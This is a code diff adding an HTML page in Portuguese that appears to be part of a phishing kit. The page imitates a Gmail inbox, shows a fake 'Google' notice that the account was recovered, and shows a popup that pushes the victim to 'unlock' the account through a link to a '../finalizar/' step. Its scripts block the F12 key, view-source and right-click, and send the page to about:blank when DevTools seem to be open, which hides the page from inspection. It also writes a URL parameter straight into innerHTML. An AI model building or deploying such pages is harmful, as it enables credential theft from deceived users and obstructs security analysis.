@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Caixa de Entrada - Gmail</title>
+  <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background: #f5f5f5;
+    }
+
+    .barra-pesquisa {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 12px;
+      border-bottom: 1px solid #ddd;
+      background-color: #fff;
+    }
+
+    .barra-pesquisa i {
+      font-size: 18px;
+      color: #707070;
+      cursor: pointer;
+    }
+
+    .barra-pesquisa span {
+      flex-grow: 1;
+      margin-left: 15px;
+      color: #707070;
+      font-size: 16px;
+    }
+
+    .barra-pesquisa img {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .titulo-principal {
+      padding: 12px 15px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #707070;
+    }
+
+    .email {
+      display: flex;
+      align-items: center;
+      background: #fff;
+      padding: 15px;
+      font-family: Arial;
+      position: relative;
+      border-bottom: 1px solid #eee;
+    }
+
+    .email img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-right: 15px;
+    }
+
+    .email .textos {
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .email .remetente {
+      font-weight: bold;
+      color: #000;
+      font-size: 17px;
+    }
+
+    .email .assunto {
+      color: #000;
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    .email .mensagem-preview {
+      color: #707070;
+      font-size: 15px;
+      font-weight: 400;
+    }
+
+    .email .info {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      text-align: right;
+    }
+
+    .email .info .hora {
+      color: #000;
+      font-weight: bold;
+      font-size: 12px;
+    }
+
+    .email .info .estrela {
+      color: #888;
+      font-size: 18px;
+      margin-top: 8px;
+      cursor: pointer;
+    }
+
+    .blur {
+      filter: blur(5px);
+    }
+
+    #meu-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+      background: white;
+      padding: 10px 10px 20px 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      border-radius: 5px;
+      text-align: center;
+      width: 300px;
+      max-width: 80%;
+      font-size: 16px;
+      font-family: Roboto, sans-serif;
+      color: #111;
+      font-weight: 400;
+    }
+
+    .botao-flutuante {
+      position: fixed;
+      width: 60px;
+      height: 60px;
+      bottom: 20px;
+      right: 20px;
+      background-color: white;
+      border-radius: 50%;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .botao-flutuante img {
+      width: 70%;
+      height: 70%;
+      object-fit: contain;
+    }
+
+    .container {
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    @media (min-width: 768px) {
+      .container {
+        max-width: 60%;
+        /* largura no desktop */
+        padding: 0;
+        /* remove padding lateral no desktop */
+      }
+      .botao-flutuante {
+        right: calc((100% - 60%) / 2);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="barra-pesquisa">
+      <i class="fas fa-bars"></i>
+      <span>Pesquisar e-mail</span>
+      <img src="avatar.png" alt="Avatar">
+    </div>
+
+    <div class="titulo-principal">PRINCIPAL</div>
+
+    <!-- Email principal com email dinâmico -->
+    <div class="email">
+      <img src="logogoogle.webp" alt="Google">
+      <div class="textos">
+        <div class="remetente">Google</div>
+        <div class="assunto">Sua conta Google foi recuperada</div>
+        <div class="mensagem-preview" id="mensagem">Seu e-mail foi recuperado com sucesso!</div>
+      </div>
+      <div class="info">
+        <div class="hora">agora</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+
+    <!-- E-mails fictícios em blur -->
+    <!-- Duplicado 14 vezes -->
+    <!-- Exemplo -->
+    <div class="email blur">
+      <img src="N-2.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Nubank</div>
+        <div class="assunto">Lista de contatos de confiança</div>
+        <div class="mensagem-preview">Lista de contatos de confiança atuali...</div>
+      </div>
+      <div class="info">
+        <div class="hora">21:17</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <!-- Repita conforme necessário -->
+    <div class="email blur">
+      <img src="A.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Acordo Certo</div>
+        <div class="assunto">Alerta: Acompanhe Seu Score</div>
+        <div class="mensagem-preview">Saiba Mais</div>
+      </div>
+      <div class="info">
+        <div class="hora">20:02</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="c.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">C6 Bank</div>
+        <div class="assunto">Antecipe seu saque FGTS</div>
+        <div class="mensagem-preview">Faça sua simulação agora mesmo</div>
+      </div>
+      <div class="info">
+        <div class="hora">18:36</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="f.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Facebook</div>
+        <div class="assunto">Você tem 7 notificações sobre...</div>
+        <div class="mensagem-preview">Veja suas notificações recentes de...</div>
+      </div>
+      <div class="info">
+        <div class="hora">16:46</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="y.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Yeesco</div>
+        <div class="assunto">Você ganhou cupom de desco...</div>
+        <div class="mensagem-preview">Aproveite seu cupom de 20% na...</div>
+      </div>
+      <div class="info">
+        <div class="hora">14:23</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="M.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">MeuJeans.com</div>
+        <div class="assunto">Código para a postagem do pro...</div>
+        <div class="mensagem-preview">Oi, tudo bem? Sua solicitação de tro...</div>
+      </div>
+      <div class="info">
+        <div class="hora">12:19</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="M.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Mercado Pago</div>
+        <div class="assunto">Seu Dinheiro Express vence hoje</div>
+        <div class="mensagem-preview">Você pode pagar o valor como pre...</div>
+      </div>
+      <div class="info">
+        <div class="hora">08:15</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="E.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Esportes da Sorte</div>
+        <div class="assunto">Torneios cheios de prêmios</div>
+        <div class="mensagem-preview">Chegou a hora de fazer muito din...</div>
+      </div>
+      <div class="info">
+        <div class="hora">06:22</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="D.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">DermaClub</div>
+        <div class="assunto">Convite especial pra você!</div>
+        <div class="mensagem-preview">Você foi selecionada pra fazer par...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="M-CINZA.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Mecado Libre</div>
+        <div class="assunto">Novidades pra você!</div>
+        <div class="mensagem-preview">Filmes e séries do Mercado Play...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="S-CINZA.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">SHEIN</div>
+        <div class="assunto">Economize no Dias das Mães!</div>
+        <div class="mensagem-preview">Looks inesquecíveis para alguem...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="S-ROSA.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Serasa</div>
+        <div class="assunto">Ainda não respondeu sobre o...</div>
+        <div class="mensagem-preview">Sua resposta é importante para...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="T.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Temu</div>
+        <div class="assunto">SURPRESA!</div>
+        <div class="mensagem-preview">Seu item adicionado está mais ba...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+    <div class="email blur">
+      <img src="S-SHOPPE.png" alt="Google">
+      <div class="textos">
+        <div class="remetente">Shopee</div>
+        <div class="assunto">Seu código pix está disponível</div>
+        <div class="mensagem-preview">Seu item adicionado está mais ba...</div>
+      </div>
+      <div class="info">
+        <div class="hora">ontem</div>
+        <i class="far fa-star estrela"></i>
+      </div>
+    </div>
+
+  </div>
+
+
+  <div id="meu-popup">
+    <p>Desbloqueie o acesso à sua<br> conta do Gmail agora.</p>
+    <a href="../finalizar/" style="
+        display: inline-block;
+        padding: 12px 20px;
+        background-color: #4285f4;
+        color: white;
+        text-decoration: none;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 15px;
+        font-family: Roboto, sans-serif;">
+      Desbloquear Agora
+    </a>
+  </div>
+
+  <a href="#" class="botao-flutuante">
+    <img src="botaoflutuante.png" alt="Botão Flutuante" />
+  </a>
+
+  <script>
+    function pegarEmailDaURL() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get('email');
+    }
+    var email = pegarEmailDaURL();
+    if (email) {
+      const frase = `Seu e-mail [email] foi recuperado com sucesso.`;
+      document.getElementById('mensagem').innerHTML = frase.replace('[email]', email);
+    } else {
+      document.getElementById('mensagem').innerHTML = "Seu e-mail foi recuperado com sucesso!";
+    }
+  </script>
+
+  <script>
+    document.addEventListener('keydown', function (event) {
+      if (event.key === 'F12' || (event.ctrlKey && event.key === 'u')) {
+        event.preventDefault();
+      }
+    });
+
+    document.addEventListener('contextmenu', function (event) {
+      event.preventDefault();
+    });
+
+    // Função para detectar se DevTools está aberto
+    function isDevToolsOpen() {
+      let threshold = 160; // O Chrome altera a diferença entre `outerHeight` e `innerHeight`
+      return (window.outerHeight - window.innerHeight > threshold) || (window.outerWidth - window.innerWidth > threshold);
+    }
+
+    // Função para detectar modo responsivo
+    function detectResponsiveMode() {
+      let isSmallScreen = window.innerWidth < 800 || window.innerHeight < 800;
+
+      if (isSmallScreen && isDevToolsOpen()) {
+        window.location.href = 'about:blank';
+      }
+    }
+
+    // Verificar no carregamento
+    window.addEventListener('load', detectResponsiveMode);
+
+    // Monitorar mudanças na tela e no DevTools
+    setInterval(detectResponsiveMode, 1000);
+  </script>
+
+</body>
+</html>
